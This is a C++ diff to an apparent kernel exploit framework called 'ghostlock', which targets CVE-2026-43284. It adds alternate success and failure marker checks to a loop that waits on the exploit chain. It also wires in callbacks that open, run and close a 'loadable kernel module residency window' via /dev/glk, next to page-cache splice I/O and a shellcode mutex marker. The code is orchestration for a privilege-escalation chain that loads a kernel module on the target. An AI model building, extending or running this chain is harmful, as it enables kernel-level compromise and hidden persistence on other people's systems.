@@ -2,6 +2,8 @@
 
 #include "backend/cve_2026_43284/real_ops.hpp"
 
+#include "backend/cve_2026_43284/lkm_window.hpp"
+
 #include <cerrno>
 #include <chrono>
 #include <cstddef>
@@ -402,10 +404,12 @@ namespace ghostlock::backend::cve_2026_43284 {
         for (;;) {
             /* Failure first: a stale success marker must not mask a fresh
              * failure marker. */
-            if (probe_exists(ctx->device, kLkmFailureMarker)) {
+            if (probe_exists(ctx->device, kLkmFailureMarker) ||
+                probe_exists(ctx->device, kLkmFailureMarkerAlt)) {
                 return steps::ChainWaitOutcome::Failed;
             }
-            if (probe_exists(ctx->device, kLkmSuccessMarker)) {
+            if (probe_exists(ctx->device, kLkmSuccessMarker) ||
+                probe_exists(ctx->device, kLkmSuccessMarkerAlt)) {
                 return steps::ChainWaitOutcome::LkmLoaded;
             }
             /* /dev/df is the shellcode mutex marker ("module loading in
@@ -487,6 +491,34 @@ namespace ghostlock::backend::cve_2026_43284 {
         ctx->released = true;
     }
 
+    namespace {
+        /* The window callbacks receive the shared write.ctx pointer (&page); a
+         * null member fails closed rather than reporting a fake window. */
+        LkmWindowRuntime *lkm_window_from_page(void *raw) noexcept {
+            if (raw == nullptr) {
+                return nullptr;
+            }
+            return context_from_page(raw)->lkm_window;
+        }
+    } // namespace
+
+    bool real_chain_open_lkm_channel(void *raw) noexcept {
+        LkmWindowRuntime *window = lkm_window_from_page(raw);
+        return window != nullptr && window->open();
+    }
+
+    bool real_chain_run_lkm_window(void *raw) noexcept {
+        LkmWindowRuntime *window = lkm_window_from_page(raw);
+        return window != nullptr && window->run();
+    }
+
+    void real_chain_close_lkm_channel(void *raw) noexcept {
+        LkmWindowRuntime *window = lkm_window_from_page(raw);
+        if (window != nullptr) {
+            window->close();
+        }
+    }
+
     steps::ChainOps make_real_chain_ops(RealChainContext &ctx) noexcept {
         if (!ctx.page.io.available()) {
             ctx.page.io = pagecache::real_splice_io();
@@ -525,6 +557,14 @@ namespace ghostlock::backend::cve_2026_43284 {
         ops.trigger = real_chain_trigger;
         ops.wait_result = real_chain_wait_result;
         ops.release = real_chain_release;
+        /* Delta-2: bind the LKM residency window only when the composition root
+         * supplied a runtime. A run with no runtime keeps the window unbound, so
+         * the chain never opens /dev/glk by accident. */
+        if (ctx.lkm_window != nullptr) {
+            ops.open_lkm_channel = real_chain_open_lkm_channel;
+            ops.run_lkm_window = real_chain_run_lkm_window;
+            ops.close_lkm_channel = real_chain_close_lkm_channel;
+        }
         return ops;
     }
 
@@ -555,6 +595,7 @@ namespace ghostlock::backend::cve_2026_43284 {
             case steps::ChainError::LkmFailed: return "LkmFailed";
             case steps::ChainError::WaitTimeout: return "WaitTimeout";
             case steps::ChainError::CleanupFailed: return "CleanupFailed";
+            case steps::ChainError::LkmWindowFailed: return "LkmWindowFailed";
         }
         return "Unknown";
     }
